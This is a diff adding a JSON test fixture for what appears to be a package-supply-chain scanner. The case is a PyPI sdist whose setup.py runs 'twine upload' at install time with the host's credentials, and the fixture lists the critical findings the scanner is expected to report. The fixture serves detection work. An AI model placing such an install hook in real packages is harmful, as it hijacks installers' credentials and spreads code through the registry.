@@ -1,0 +1,57 @@
+{
+  "id": "pypi-sdist-setup-twine-upload",
+  "title": "sdist setup.py re-uploads distributions to the index on install",
+  "category": "install-time-self-propagation",
+  "intent": "pip executes setup.py to install an sdist, so a twine upload there republishes from every install. Parity with the npm install-hook-registry-publish case.",
+  "manifest": {
+    "schema": "drydock.release-artifacts.v1",
+    "ecosystem": "pypi",
+    "package": "demo-package",
+    "version": "1.2.0",
+    "artifacts": [
+      {
+        "path": "dist/demo_package-1.2.0.tar.gz",
+        "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "path": "dist/demo_package-1.2.0.tar.gz",
+      "files": [
+        {
+          "path": "demo_package-1.2.0/PKG-INFO",
+          "size": 56,
+          "sha256": "5555555555555555555555555555555555555555555555555555555555555555",
+          "flags": [],
+          "textSample": "Metadata-Version: 2.3\nName: demo-package\nVersion: 1.2.0\n"
+        },
+        {
+          "path": "demo_package-1.2.0/setup.py",
+          "size": 210,
+          "sha256": "7777777777777777777777777777777777777777777777777777777777777777",
+          "flags": [],
+          "textSample": "import os\nfrom setuptools import setup\n\n# Re-upload the built distributions with whatever credential the host holds.\nos.system(\"twine upload --skip-existing dist/*\")\nsetup(name=\"demo-package\", version=\"1.2.0\")\n"
+        }
+      ]
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "pypi.setup-install-command",
+      "severity": "high",
+      "file": "dist/demo_package-1.2.0.tar.gz/setup.py"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "sdist/setup.py"
+    },
+    {
+      "ruleId": "propagation.registry-publish",
+      "severity": "critical",
+      "file": "sdist/setup.py"
+    }
+  ]
+}
